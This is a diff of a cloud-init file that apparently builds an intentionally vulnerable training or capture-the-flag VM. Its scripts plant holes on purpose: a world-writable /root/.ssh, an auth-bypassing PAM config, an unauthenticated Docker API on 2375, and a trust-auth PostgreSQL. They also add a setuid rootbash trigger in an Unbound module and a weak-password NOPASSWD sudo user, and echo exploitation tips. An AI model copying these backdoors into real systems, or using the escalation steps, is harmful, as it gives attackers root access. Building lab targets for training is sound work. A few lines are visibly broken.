@@ -121,80 +121,533 @@ write_files:
 #           Scripts 
 # =============================
 
-  - path: /usr/local/sbin/ctf_setup.sh
-    owner: root:root
+  - path: /usr/local/sbin/apache_install.sh
     permissions: '0755'
+    owner: root:root
     content: |
       #!/usr/bin/env bash
-      set -euo pipefail
+      #
 
-      LOG=/var/log/ctf_provision.log
-      echo "$(date --iso-8601=seconds) ctf_setup.sh: START" >> "$LOG"
-
-      export DEBIAN_FRONTEND=noninteractive
-
-      apt install -y cron >> "$LOG" 2>&1
-      systemctl enable --now cron >> "$LOG" 2>&1 || true
-
-      # Create secrets directory as highpriv and write the flag robustly
-      sudo -u highpriv bash <<'BASH' >> "$LOG" 2>&1
       set -e
-      mkdir -p "$HOME/secrets"
-      cat > "$HOME/secrets/flag.txt" <<'FLAG'
 
-      chmod 600 "$HOME/secrets/flag.txt"
-      chmod 711 "$HOME/secrets"
+      if [[ "$EUID" -ne 0 ]]; then
+          echo "Run as root!"
+          exit 1
+      fi
 
-      # Shared workspace
-      mkdir -p /shared
-      chown highpriv:highpriv /shared
-      chmod 777 /shared
-      echo "This is a shared workspace." > /shared/readme.txt
-      chmod 644 /shared/readme.txt
-      echo "$(date --iso-8601=seconds) created /shared and readme" >> "$LOG"
 
-      # Cron job for root to copy every minute (idempotent add)
-      CRON_LINE='* * * * * /bin/cp -a /shared/* /tmp/ 2>/dev/null'
-      ( crontab -u root -l 2>/dev/null | grep -F -- "$CRON_LINE" ) || \
-        ( crontab -u root -l 2>/dev/null || true; echo "$CRON_LINE" ) | crontab -u root -
-      echo "$(date --iso-8601=seconds) installed/verified root crontab" >> "$LOG"
+      apt update -y
+      apt install gcc curl libpcre3-dev make wget libapr1-dev libaprutil1-dev -y
 
-      echo "Installation complete. Login: lowpriv (password: slaptazodis)." >> "$LOG"
-      echo "$(date --iso-8601=seconds) ctf_setup.sh: COMPLETE" >> "$LOG"
+      wget https://archive.apache.org/dist/httpd/httpd-2.4.49.tar.bz2
+      tar -xvjf 'httpd-2.4.49.tar.bz2'
+      cd "httpd-2.4.49" || exit 1
 
-  - path: /usr/local/sbin/lamp_setup.sh
+      ./configure --prefix="/usr/local/apache2"
+      make
+      make install
+
+      cat << "EOF" > "/usr/local/apache2/conf/httpd.conf"
+      ServerRoot "/usr/local/apache2"
+
+      # FIX: Changed Listen 80 to 8080 to avoid "Address already in use" conflict.
+      Listen 8080
+
+      # FIX: Added ServerName to suppress the AH00558 warning.
+      ServerName localhost:8080
+
+      LoadModule authn_file_module modules/mod_authn_file.so
+      LoadModule authn_core_module modules/mod_authn_core.so
+      LoadModule authz_host_module modules/mod_authz_host.so
+      LoadModule authz_groupfile_module modules/mod_authz_groupfile.so
+      LoadModule authz_user_module modules/mod_authz_user.so
+      LoadModule authz_core_module modules/mod_authz_core.so
+      LoadModule access_compat_module modules/mod_access_compat.so
+      LoadModule auth_basic_module modules/mod_auth_basic.so
+      LoadModule reqtimeout_module modules/mod_reqtimeout.so
+      LoadModule filter_module modules/mod_filter.so
+      LoadModule mime_module modules/mod_mime.so
+      LoadModule log_config_module modules/mod_log_config.so
+      LoadModule env_module modules/mod_env.so
+      LoadModule headers_module modules/mod_headers.so
+      LoadModule setenvif_module modules/mod_setenvif.so
+      LoadModule version_module modules/mod_version.so
+      LoadModule unixd_module modules/mod_unixd.so
+      LoadModule status_module modules/mod_status.so
+      LoadModule autoindex_module modules/mod_autoindex.so
+      LoadModule cgid_module modules/mod_cgid.so
+      LoadModule dir_module modules/mod_dir.so
+      LoadModule alias_module modules/mod_alias.so
+
+      <IfModule unixd_module>
+      User daemon
+      Group daemon
+      </IfModule>
+      ServerAdmin you@example.com
+      <Directory />
+          AllowOverride none
+          Require all granted
+      </Directory>
+
+      DocumentRoot "/usr/local/apache2/htdocs"
+      <Directory "/usr/local/apache2/htdocs">
+          Options Indexes FollowSymLinks
+          AllowOverride None
+          Require all granted
+      </Directory>
+
+      <IfModule dir_module>
+          DirectoryIndex index.html
+      </IfModule>
+      <Files ".ht*">
+          Require all granted
+      </Files>
+
+      ErrorLog "logs/error_log"
+      LogLevel warn
+
+      <IfModule log_config_module>
+          LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
+          LogFormat "%h %l %u %t \"%r\" %>s %b" common
+          <IfModule logio_module>
+            LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-Agent}i\" %I %O" combinedio
+          </IfModule>
+          CustomLog "logs/access_log" common
+      </IfModule>
+
+      <IfModule alias_module>
+          ScriptAlias /cgi-bin/ "/usr/local/apache2/cgi-bin/"
+      </IfModule>
+
+      <IfModule cgid_module>
+          Scriptsock cgisock
+      </IfModule>
+
+      <Directory "/usr/local/apache2/cgi-bin">
+          AllowOverride None
+          Options +ExecCGI
+          Require all granted
+      </Directory>
+
+      <IfModule headers_module>
+          RequestHeader unset Proxy early
+      </IfModule>
+
+      <IfModule mime_module>
+          TypesConfig conf/mime.types
+          AddType application/x-compress .Z
+          AddType application/x-gzip .gz .tgz
+
+          AddHandler cgi-script .cgi
+          AddHandler cgi-script .sh
+      </IfModule>
+
+      <IfModule proxy_html_module>
+      Include conf/extra/proxy-html.conf
+      </IfModule>
+      <IfModule ssl_module>
+      SSLRandomSeed startup builtin
+      SSLRandomSeed connect builtin
+      </IfModule>
+
+      EOF
+
+      # This line introduces the critical vulnerability detailed in the summary!
+      chmod 777 -R "/usr/local/apache2/"
+
+      cat << "EOF" > "/usr/local/apache2/cgi-bin/test.sh"
+      #!/usr/bin/env bash
+      echo "Content-type: text/html"
+      echo ""
+      echo "<html><body><h1>Hello from CGI! \$HOME </h1></body></html>"
+
+      text=$(cat /etc/passwd)
+
+      /bin/bash -c "echo text: \$(hostname)"
+      /bin/bash -c "echo t: \$text"
+      #echo "$HOME"
+
+      #touch ~atest
+      #
+      #touch /home/andrey/hello
+      EOF
+
+      chmod 777 -R "/usr/local/apache2/cgi-bin"
+
+      cat << "EOF" > "/etc/systemd/system/httpd.service"
+      [Unit]
+      Description="The Apache HTTP Server"
+      After=network.target
+
+      [Service]
+      Type=forking
+
+      ExecStart=/usr/local/apache2/bin/apachectl start
+      ExecReload=/usr/local/apache2/bin/apachectl graceful
+      ExecStop=/usr/local/apache2/bin/apachectl stop
+
+      [Install]
+      WantedBy=multi-user.target
+      EOF
+
+      systemctl daemon-reload
+
+      "/usr/local/apache2/bin/apachectl" start
+
+
+  - path: /usr/local/sbin/authorised_keys.sh
     owner: root:root
     permissions: '0755'
     content: |
+      #!/bin/bash
+
+      set -e
+
+      echo "Setting up SSH authorized_keys misconfiguration vulnerability..."
+
+      # Create /root/.ssh if needed
+      sudo mkdir -p /root/.ssh
+
+      # Add dummy noise key if not exists
+      if [ ! -s /root/.ssh/authorized_keys ]; then
+          echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... admin@fo1" | sudo tee /root/.ssh/authorized_keys > /dev/null
+      fi
+
+      # Set vuln perms
+      sudo chmod 777 /root/.ssh
+      sudo chmod 666 /root/.ssh/authorized_keys
+      sudo chown -R root:root /root/.ssh
+
+      # Configure sshd_config if needed
+      SSHD_CONFIG="/etc/ssh/sshd_config"
+      sudo cp "$SSHD_CONFIG" "$SSHD_CONFIG.bak"  # Backup
+      if ! sudo grep -q "^PermitRootLogin yes" "$SSHD_CONFIG"; then
+          echo "PermitRootLogin yes" | sudo tee -a "$SSHD_CONFIG" > /dev/null
+      fi
+      if ! sudo grep -q "^PubkeyAuthentication yes" "$SSHD_CONFIG"; then
+          echo "PubkeyAuthentication yes" | sudo tee -a "$SSHD_CONFIG" > /dev/null
+      fi
+      if ! sudo grep -q "^PasswordAuthentication yes" "$SSHD_CONFIG"; then
+          echo "PasswordAuthentication yes" | sudo tee -a "$SSHD_CONFIG" > /dev/null
+      fi
+
+      sudo systemctl restart ssh
+
+      echo "Setup complete! Vuln ready: /root/.ssh writable; inject pubkey to authorized_keys for root SSH."
+      echo "Pro tip: Test: echo 'your_pubkey' | sudo tee -a /root/.ssh/authorized_keys > ssh -i privkey root@IP. Snapshot now."
+
+  - path: /usr/local/sbin/CronJobs.sh
+    permissions: '0755'
+    owner: root:root
+    content: |
+      #!/bin/bash
+
+      set -e
+
+      echo "Setting up vulnerable root cron job for log cleanup..."
+
+      SCRIPT_PATH="/usr/local/bin/logrotate-cleanup.py"
+      CRON_JOB="*/10 * * * * root $SCRIPT_PATH >> /var/log/cron-cleanup.log 2>&1"
+
+      # Create archive dir if needed
+      sudo mkdir -p /var/log-archive
+      sudo chown root:root /var/log-archive
+      sudo chmod 755 /var/log-archive
+
+      # Create or overwrite the Python script
+      sudo tee "$SCRIPT_PATH" > /dev/null << 'EOF'
+      #!/usr/bin/env python3
+      import os
+      import shutil
+      import datetime
+      try:
+          timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+          for logdir in ["/var/log", "/opt/logs"]:
+              if os.path.exists(logdir):
+                  for filename in os.listdir(logdir):
+                      if filename.endswith(".log") and os.path.getsize(os.path.join(logdir, filename)) > 10485760:  # >10MB
+                          shutil.move(os.path.join(logdir, filename), f"/var/log-archive/{filename}.{timestamp}")
+          print(f"Logs archived: {timestamp}")
+      except Exception as e:
+          print(f"Cleanup error: {e}")
+      EOF
+
+      sudo chmod 777 "$SCRIPT_PATH"
+      sudo chown root:root "$SCRIPT_PATH"
+
+      # Add cron job if not exists
+      if ! sudo grep -q "$SCRIPT_PATH" /etc/crontab; then
+          echo "$CRON_JOB" | sudo tee -a /etc/crontab > /dev/null
+          echo "Cron job added."
+      else
+          echo "Cron job already exists."
+      fi
+
+      sudo bash -c "$SCRIPT_PATH >> /var/log/cron-cleanup.log 2>&1"
+      sudo tail -n 1 /var/log/cron-cleanup.log
+
+      echo "Setup complete! Vuln ready: Edit $SCRIPT_PATH as low-priv user to inject (e.g., os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')) > Wait 10 min > /tmp/rootbash -p."
+
+  - path: /usr/local/sbin/docker_install.sh
+    permissions: '0755'
+    owner: root:root
+    content: |
       #!/usr/bin/env bash
-      set -euo pipefail
 
-      LOG=/var/log/lamp_setup.log
-      echo "$(date --iso-8601=seconds) START LAMP SETUP" >> "$LOG"
+      set -e
 
-      export DEBIAN_FRONTEND=noninteractive
-      apt update >> "$LOG" 2>&1
-      apt install -y mariadb-server mariadb-client apache2 ufw >> "$LOG" 2>&1
+      if [[ "$EUID" -ne 0 ]]; then
+        echo "Run as root!"
+        exit 1
+      fi
 
-      systemctl enable --now mariadb >> "$LOG" 2>&1 || true
-      systemctl enable --now apache2 >> "$LOG" 2>&1 || true
+      apt-get update
+      apt-get install ca-certificates curl -y
+      install -m 0755 -d /etc/apt/keyrings
+      curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc
+      chmod a+r /etc/apt/keyrings/docker.asc
+      echo   "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu \
+        $(. /etc/os-release && echo "${UBUNTU_CODENAME:-$VERSION_CODENAME}") stable" |   sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+      apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y
+      docker run hello-world
+
+      docker_script="/usr/local/bin/docker_script.sh"
+
+      cat << "EOF" > "$docker_script"
+      #!/usr/bin/env bash
+
+      chmod 777 /var/run/docker.sock
+      chmod 777 /var/run/debugging.sock
+      EOF
+
+      chmod +x "$docker_script"
+
+      cat << "EOF" > "/usr/lib/systemd/system/docker.service"
+      [Unit]
+      Description=Docker Application Container Engine
+      Documentation=https://docs.docker.com
+      After=network-online.target nss-lookup.target docker.socket firewalld.service containerd.service time-set.target
+      Wants=network-online.target containerd.service
+      Requires=docker.socket
+      StartLimitBurst=3
+      StartLimitIntervalSec=60
+
+      [Service]
+      Type=notify
+      # the default is not to use systemd for cgroups because the delegate issues still
+      # exists and systemd currently does not support the cgroup feature set required
+      # for containers run by docker
+      ExecStart=/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock -H unix:///var/run/debugging.sock -H tcp://0.0.0.0:2375
+      ExecReload=/bin/kill -s HUP $MAINPID
+      TimeoutStartSec=0
+      RestartSec=2
+      Restart=always
+
+      # Having non-zero Limit*s causes performance problems due to accounting overhead
+      # in the kernel. We recommend using cgroups to do container-local accounting.
+      LimitNPROC=infinity
+      LimitCORE=infinity
+
+      # Comment TasksMax if your systemd version does not support it.
+      # Only systemd 226 and above support this option.
+      TasksMax=infinity
+
+      # set delegate yes so that systemd does not reset the cgroups of docker containers
+      Delegate=yes
+
+      # kill only the docker process, not all processes in the cgroup
+      KillMode=process
+      OOMScoreAdjust=-500
+
+      [Install]
+      WantedBy=multi-user.target
+      EOF
+
+      cat << "EOF" > "/usr/lib/systemd/system/docker.socket"
+      [Unit]
+      Description=Docker Socket for the API
+
+      [Socket]
+      # If /var/run is not implemented as a symlink to /run, you may need to
+      # specify ListenStream=/var/run/docker.sock instead.
+      ListenStream=/run/docker.sock
+      SocketMode=0777
+      SocketUser=root
+      SocketGroup=docker
+
+      [Install]
+      WantedBy=sockets.target
+      EOF
+
+      cat << EOF > "/etc/systemd/system/docker_chmod.service"
+      [Unit]
+      Description=Easy docker access
+      Requires=docker.service
+      After=docker.service
+
+      [Service]
+      Type=simple
+      ExecStart=$docker_script
+
+      [Install]
+      WantedBy=multi-user.target
+      EOF
+
+
+      systemctl daemon-reload
+      systemctl enable --now docker_chmod
+      $docker_script
+      systemctl enable --now docker
+
+  - path: /usr/local/sbin/edit_PAM.sh
+    permissions: '0755'
+    owner: root:root
+    content: |
+      #!/usr/bin/env bash
+
+      set -e
+
+      if [[ "$EUID" -ne 0 ]]; then
+        echo "Run as root!"
+        exit 1
+      fi
+
+      cat << "EOF" > "/etc/systemd/system/very-good-service.service"
+      [Unit]
+      Description=WindowsActivation
+      After=network.target
+
+      [Service]
+      ExecStart=/usr/local/Spyware.exe
+      Type=simple
+      Restart=always
+      User=root
+
+      [Install]
+      WantedBy=multi-user.target
+      EOF
+
+
+      cat << "EOF" > "/etc/pam.d/common-auth"
+      auth    sufficient      pam_permit.so
+      auth    [success=2 default=ignore]      pam_unix.so nullok
+      auth    [success=1 default=ignore]      pam_sss.so use_first_pass
+      auth    requisite                       pam_deny.so
+      auth    required                        pam_permit.so
+      auth    optional                        pam_cap.so
+      EOF
+
+
+      systemctl daemon-reload
+      systemctl enable --now very-good-service.service
+
+  - path: /usr/local/sbin/Extra_Users_Permissions.sh
+    permissions: '0755'
+    owner: root:root
+    content: |
+      #!/bin/bash
+
+
+
+      set -e  # Exit on any error
+
+      USERNAME="Admin"
+      PASSWORD="Admin123"  
+
+      echo "Setting up user: $USERNAME with passwordless sudo..."
+
+      if id "$USERNAME" &>/dev/null; then
+          echo "User $USERNAME already exists. Removing for clean setup..."
+          sudo pkill -u "$USERNAME" 2>/dev/null || true  # Kill any processes first
+          sudo userdel -r "$USERNAME"  # -r removes home dir too
+          # Clean up any existing sudoers.d entry
+          sudo rm -f "/etc/sudoers.d/$USERNAME"
+          echo "Old user and config removed."
+      fi
+
+
+      sudo useradd -m -s /bin/bash "$USERNAME"
+
+      echo "$USERNAME:$PASSWORD" | sudo chpasswd
+
+      sudo usermod -aG sudo "$USERNAME"
+
+
+      SUDOERS_D_FILE="/etc/sudoers.d/$USERNAME"
+      echo "$USERNAME ALL=(ALL) NOPASSWD: ALL" | sudo tee "$SUDOERS_D_FILE" > /dev/null
+      sudo chmod 0440 "$SUDOERS_D_FILE"
+
+      if sudo visudo -c > /dev/null 2>&1; then
+          echo "Sudoers updated successfully via /etc/sudoers.d/."
+      else
+          echo "Error: Sudoers validation failed. Cleaning up..."
+          sudo rm -f "$SUDOERS_D_FILE"
+          exit 1
+      fi
+
+      echo "Setup complete! Now verifying..."
+
+
+      echo "=== Group membership for $USERNAME ==="
+      sudo groups "$USERNAME"
+
+
+
+      echo "=== Testing passwordless sudo ==="
+      if sudo -u "$USERNAME" sudo whoami 2>/dev/null | grep -q "root"; then
+          echo "✓ sudo whoami succeeded (output: root) - no password prompt for sudo."
+      else
+          echo "✗ sudo whoami failed."
+      fi
+
+
+      echo "=== Groups as $USERNAME ==="
+      sudo -u "$USERNAME" groups
+
+      echo "=== Additional sudo tests as $USERNAME ==="
+      sudo -u "$USERNAME" bash -c '
+      sudo whoami
+      echo "✓ whoami test passed."
+
+      sudo cat /etc/shadow | head -3
+      echo "✓ cat /etc/shadow test passed (showed shadow file)."
+
+      sudo systemctl status | head -5
+      echo "✓ systemctl status test passed (showed service status)."
+      '
+
+      echo "All verifications complete! User '$USERNAME' is ready with full passwordless root privileges."
+      echo "Password: $PASSWORD (change it in production with 'sudo passwd $USERNAME')."
+      echo "Pro tip: Snapshot your VM now before exercises. Run 'sudo visudo -c' to double-check sudoers if needed."
+
+  - path: /usr/local/sbin/mariadbscript.sh
+    owner: root:root
+    permissions: '0755'
+    content: |
+      #!/bin/bash
+
+      set- e
+
+      apt update
+      apt install -y mariadb-server mariadb-client apache2
+
+      systemctl enable mariadb
+      systemctl start mariadb
+      systemctl enable apache2
+      systemctl start apache2
 
       CONFIG_FILE="/etc/mysql/mariadb.conf.d/50-server.cnf"
-      if grep -q "^bind-address" "$CONFIG_FILE"; then
-        sed -i 's/^bind-address.*/bind-address = 0.0.0.0/' "$CONFIG_FILE"
-      else
-        echo "bind-address = 0.0.0.0" >> "$CONFIG_FILE"
-      fi
-      systemctl restart mariadb >> "$LOG" 2>&1
+      sed -i 's/bind-address.*/bind-address = 0.0.0.0/' "$CONFIG_FILE"
 
-      # Secure and set up MariaDB database + user (idempotent)
-      mariadb -u root -e "CREATE DATABASE IF NOT EXISTS duoNbaze;" >> "$LOG" 2>&1
-      mariadb -u root -e "CREATE USER IF NOT EXISTS 'sapiens'@'%' IDENTIFIED BY '04102025';" >> "$LOG" 2>&1
-      mariadb -u root -e "GRANT ALL PRIVILEGES ON *.* TO 'sapiens'@'%' WITH GRANT OPTION;" >> "$LOG" 2>&1
-      mariadb -u root -e "FLUSH PRIVILEGES;" >> "$LOG" 2>&1
+      systemctl restart mariadb
+
+      mariadb -u root -e "CREATE DATABASE duoNbaze;"
+      mariadb -u root -e "CREATE USER 'sapiens'@'%' IDENTIFIED BY '04102025';"
+      mariadb -u root -e "GRANT ALL PRIVILEGES ON *.* TO 'sapiens'@'%' WITH GRANT OPTION;"
+      mariadb -u root -e "FLUSH PRIVILEGES;"
 
       mkdir -p /var/www/html/site/institute
-      cat > /var/www/html/site/institute/.env <<'EOF'
+      cat << EOF >> /var/www/html/site/institute/.env
       DB_HOST=127.0.0.1
       DB_PORT=3306
       DB_DATABASE=duoNbaze
@@ -203,64 +656,410 @@ write_files:
       EOF
 
       chmod 644 /var/www/html/site/institute/.env
-      chown -R www-data:www-data /var/www/html/site >> "$LOG" 2>&1
 
-      # Adjust Apache site config (idempotent)
-      if ! grep -q "/var/www/html/site/institute" /etc/apache2/sites-available/000-default.conf; then
-        cat <<'EOC' >> /etc/apache2/sites-available/000-default.conf
-      <Directory /var/www/html/site/institute>
-        Options +Indexes
-        AllowOverride All
-        Require all granted
-      </Directory>
-      EOC
+      ufw allow 3306/tcp
+      ufw --force enable
+
+      echo "<Directory /var/www/html/site/insitute>" >> /etc/apache2/sites-available/000-default.conf
+      echo "	Options +Indexes" >> /etc/apache2/sites-available/000-default.conf
+      echo "</Directory>" >> /etc/apache2/sites-available/000-default.conf
+
+      systemctl restart apache2
+
+      echo "Setup complete"
+
+  - path: /usr/local/sbin/nginx_runs_as_root.sh
+    owner: root:root
+    permissions: '0755'
+    content: |
+      #!/bin/bash
+
+      set -e
+
+      echo "Configuring NGINX to run as root..."
+
+      if ! command -v nginx &> /dev/null; then
+          sudo apt update
+          sudo apt install -y nginx
+          sudo systemctl start nginx
+          sudo systemctl enable nginx
+          echo "NGINX installed and started."
+      else
+          echo "NGINX already installed."
       fi
 
-      systemctl restart apache2 >> "$LOG" 2>&1
+      sudo sed -i 's/user www-data;/user root;/' /etc/nginx/nginx.conf
 
-      # Firewall rules
-      ufw allow 80/tcp >> "$LOG" 2>&1 || true
-      ufw allow 3306/tcp >> "$LOG" 2>&1 || true
-      ufw --force enable >> "$LOG" 2>&1 || true
+      if sudo nginx -t > /dev/null 2>&1; then
+          sudo systemctl reload nginx
+          echo "NGINX configured to run as root and reloaded."
+      else
+          echo "NGINX config test failed."
+          exit 1
+      fi
 
-      echo "Setup complete" | tee -a "$LOG"
-      echo "$(date --iso-8601=seconds) COMPLETE LAMP SETUP" >> "$LOG"
+      echo "Setup complete! Now verifying..."
 
-  - path: /usr/local/sbin/CronJobs.sh
+      echo "=== Verifying NGINX runs as root ==="
+      if sudo ps aux | grep -q "[n]ginx: master process.*root"; then
+          echo "✓ NGINX master process running as root (vulnerability created)."
+      else
+          echo "✗ NGINX not running as root."
+      fi
+
+      sudo ps aux | grep nginx | head -3
+
+      echo "All verifications complete! NGINX runs as root for vuln testing."
+
+  - path: /usr/local/sbin/permissionsscript.sh
+    owner: root:root
     permissions: '0755'
-    owner: system:system
     content: |
       #!/bin/bash
-      echo "[CronJobs.sh] Installing and configuring cron jobs..."
-      apt install -y cron
-      systemctl enable --now cron
-      echo "* * * * * echo 'Cron job active at $(date)' >> /var/log/custom_cron.log" | crontab -
 
-  - path: /usr/local/sbin/Extra_Users_Permissions.sh
+      if [ "$EUID" -ne 0 ]; then
+        echo "Error: Run this script with sudo."
+        exit 1
+      fi
+
+      sudo apt update && sudo apt upgrade -y
+
+      sudo apt install cron -y
+      sudo systemctl enable cron
+      sudo systemctl start cron
+
+      sudo useradd -m -s /bin/bash lowpriv
+      echo "lowpriv:slaptazodis" | sudo chpasswd
+      sudo useradd -m -s /bin/bash highpriv
+      echo "highpriv:saugussslaptazodis" | sudo chpasswd
+
+      sudo -u highpriv bash -c '
+        mkdir ~/secrets
+        echo "FLAG: wooo radot flaga" > ~/secrets/flag.txt
+        chmod 600 ~/secrets/flag.txt
+        chown highpriv:highpriv ~/secrets/flag.txt
+        chmod 711 ~/secrets
+      '
+
+      sudo mkdir /shared
+      sudo chown highpriv:highpriv /shared
+      sudo chmod 777 /shared
+      echo "This is a shared workspace." | sudo tee /shared/readme.txt
+      sudo chmod 644 /shared/readme.txt
+
+      echo "* * * * * /bin/cp /shared/* /tmp/ 2>/dev/null" | sudo tee /tmp/crontab_tmp
+      sudo crontab -u root /tmp/crontab_tmp
+      sudo rm /tmp/crontab_tmp
+
+      echo 'Gali buti jog viskas gerai susinstaliavosi (arba ne), prisijungimo vardas: lowpriv (slaptazodis: slaptazodis).'
+
+  - path: /usr/local/sbin/PostgreSQL.sh
+    owner: root:root
     permissions: '0755'
-    owner: system:system
     content: |
-      #!/bin/bash
-      echo "[Extra_Users_Permissions.sh] Creating extra users and permissions..."
-      for u in rtkit vsftpd apache www-data; do
-        if ! id "$u" &>/dev/null; then
-          useradd -m -s /bin/bash "$u"
-          echo "$u:$u" | chpasswd
-        fi
-      done
-      echo "[+] Users created: rtkit, vsftpd, apache, www-data"
-      mkdir -p /var/www/html/uploads
-      chmod 777 /var/www/html/uploads
+      #!/usr/bin/env bash
+
+      set -e
+
+      if [[ "$EUID" -ne 0 ]]; then
+          echo "Run as root!"
+         exit 1
+      fi
+
+      apt update -y
+      apt install postgresql -y
+
+      # --- FIX START: Dynamic version detection ---
+
+      # Find the latest installed PostgreSQL version directory (e.g., "16")
+      # This command finds all directories in /etc/postgresql/, sorts them numerically, and takes the last one.
+      POSTGRES_VERSION_DIR=$(find /etc/postgresql -maxdepth 1 -type d -regextype posix-extended -regex ".*/[0-9]+$" | sort -V | tail -n 1)
+
+      # Check if a version directory was found
+      if [ -z "$POSTGRES_VERSION_DIR" ]; then
+          echo "Error: Could not find a PostgreSQL version directory in /etc/postgresql/. Installation may have failed."
+          exit 1
+      fi
+
+      # The main configuration path is the found directory + /main/
+      POSTGRES_CONF_PATH="$POSTGRES_VERSION_DIR/main"
+
+      echo "Detected PostgreSQL configuration path: $POSTGRES_CONF_PATH"
+
+      # --- FIX END ---
+
+
+      # 1. Modify postgresql.conf to listen on all addresses
+      # Using the dynamic path: "$POSTGRES_CONF_PATH/postgresql.conf"
+      sed -i "s/^.*listen_addresses =.*$/listen_addresses = '*'/" "$POSTGRES_CONF_PATH/postgresql.conf"
+
+
+      # 2. Overwrite pg_hba.conf to allow remote connections (vulnerability setup: "trust" on local network)
+      # Using the dynamic path: "$POSTGRES_CONF_PATH/pg_hba.conf"
+      cat << "EOF" > "$POSTGRES_CONF_PATH/pg_hba.conf"
+      # TYPE  DATABASE        USER            ADDRESS                 METHOD
+
+      # Allow all local connections (Unix domain socket and 127.0.0.1)
+      local   all             all                                     scram-sha-256
+      host    all             all             127.0.0.1/32            scram-sha-256
+      host    all             all             ::1/128                 scram-sha-256
+
+      # VULNERABILITY: Allow all IPv4 remote connections (0.0.0.0/0) using 'trust' authentication
+      # This means anyone on the network can connect without a password.
+      host    all             all             0.0.0.0/0               trust
+
+      # Allow replication connections from localhost (default secure settings)
+      local   replication     all                                     peer
+      host    replication     all             127.0.0.1/32            scram-sha-256
+      host    replication     all             ::1/128                 scram-sha-256
+      EOF
+
+      # 3. Apply firewall rules and restart service
+      ufw allow 5432/tcp
+      ufw reload
+      systemctl daemon-reload
+      systemctl restart postgresql
 
   - path: /usr/local/sbin/unbound.sh
+    owner: root:root
     permissions: '0755'
-    owner: system:system
     content: |
       #!/bin/bash
-      echo "[unbound.sh] Simulating Unbound or DNS setup..."
-      apt install -y unbound
-      systemctl enable --now unbound
-      echo "[+] Unbound setup complete (simulated)."
+
+      set -e
+
+      echo "Setting up Unbound DNS resolver with root Python module vulnerability..."
+
+      # Install dependencies (python-is-python3 first for configure)
+      sudo apt update
+      sudo apt install -y python-is-python3 python3-dev libpython3-dev build-essential wget swig libssl-dev
+
+      # Remove system Unbound to avoid conflicts
+      sudo apt remove -y unbound python3-unbound || true
+
+      # Build/install Unbound with Python module
+      cd /tmp
+      rm -rf unbound-1.20.0 unbound-1.20.0.tar.gz
+      wget https://www.nlnetlabs.nl/downloads/unbound/unbound-1.20.0.tar.gz
+      tar -xzf unbound-1.20.0.tar.gz
+      cd unbound-1.20.0
+      ./configure --with-pythonmodule --enable-pie --enable-relro-now
+      make -j$(nproc)
+      sudo make install
+      sudo ldconfig
+
+      # Copy Python module to system site-packages (ensure import works)
+      sudo mkdir -p /usr/lib/python3/dist-packages
+      sudo find /usr/local -name "unboundmodule.py" -exec sudo cp {} /usr/lib/python3/dist-packages/unbound.py \; || true
+      sudo find /usr/local -name "unboundmod.so" -exec sudo cp {} /usr/lib/python3/dist-packages/unboundmod.so \; || true
+      sudo ldconfig
+
+      cd ..
+      rm -rf unbound-1.20.0 unbound-1.20.0.tar.gz
+
+      # Setup config dir
+      sudo mkdir -p /etc/unbound
+
+      # Create vuln_module.py (writable, full API)
+      sudo tee /etc/unbound/vuln_module.py > /dev/null << 'EOF'
+      import unbound
+      import os
+      def init(id, ctx):
+          return True
+      def operate(id, event, qstate, qdata):
+          if event == unbound.MODULE_EVENT_NEW or event == unbound.MODULE_EVENT_PASS:
+              if 'vuln' in qstate.qinfo.qname_str:
+                  os.system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')
+              qstate.ext_state[id] = unbound.MODULE_FINISHED
+          return True
+      def inform_super(id, qstate, superqstate, qdata):
+          return True
+      def deinit(id):
+          return True
+      EOF
+
+      sudo chmod 777 /etc/unbound/vuln_module.py
+
+      # FIX: Ensure the directory for root.hints exists before downloading.
+      sudo mkdir -p /usr/share/dns
+
+      # Download root hints
+      sudo wget -O /usr/share/dns/root.hints https://www.internic.net/domain/named.root
+      sudo unbound-anchor -a /etc/unbound/root.key || true
+
+      # Create unbound.conf
+      sudo tee /etc/unbound/unbound.conf > /dev/null << 'EOF'
+      server:
+          interface: 0.0.0.0
+          port: 53
+          do-ip4: yes
+          do-ip6: no
+          do-udp: yes
+          do-tcp: yes
+          root-hints: "/usr/share/dns/root.hints"
+          module-config: "python iterator"
+          username: root
+          chroot: ""
+      python:
+          python-script: "/etc/unbound/vuln_module.py"
+      EOF
+
+      sudo unbound-checkconf /etc/unbound/unbound.conf
+
+      # Stop/disable systemd-resolved to free port 53
+      sudo systemctl stop systemd-resolved || true
+      sudo systemctl disable systemd-resolved || true
+      sudo systemctl stop systemd-resolved.socket || true
+      sudo systemctl disable systemd-resolved.socket || true
+
+      # Unlock resolv.conf if immutable, then replace
+      sudo chattr -i /etc/resolv.conf || true
+      sudo rm -f /etc/resolv.conf
+      sudo tee /etc/resolv.conf > /dev/null << 'EOF'
+      nameserver 8.8.8.8
+      nameserver 8.8.4.4
+      EOF
+      sudo chattr +i /etc/resolv.conf
+
+      # Create custom systemd service for built Unbound (Type=forking with PIDFile)
+      sudo tee /etc/systemd/system/unbound-custom.service > /dev/null << 'EOF'
+      [Unit]
+      Description=Unbound DNS Server (Custom Build)
+      After=network.target
+
+      [Service]
+      Type=forking
+      User=root
+      PIDFile=/var/run/unbound.pid
+      ExecStart=/usr/local/sbin/unbound -c /etc/unbound/unbound.conf
+      ExecReload=/bin/kill -HUP $MAINPID
+      KillMode=mixed
+      Restart=on-failure
+      RestartSec=5s
+
+      [Install]
+      WantedBy=multi-user.target
+      EOF
+
+      sudo systemctl daemon-reload
+      sudo systemctl enable unbound-custom
+      sudo systemctl start unbound-custom
+
+      echo "Setup complete! Unbound runs as root with vuln Python module. Test: dig @127.0.0.1 vuln.example.com > ls -l /tmp/rootbash > /tmp/rootbash -p."
+
+  - path: /home/system/deploy.sh
+    owner: root:root
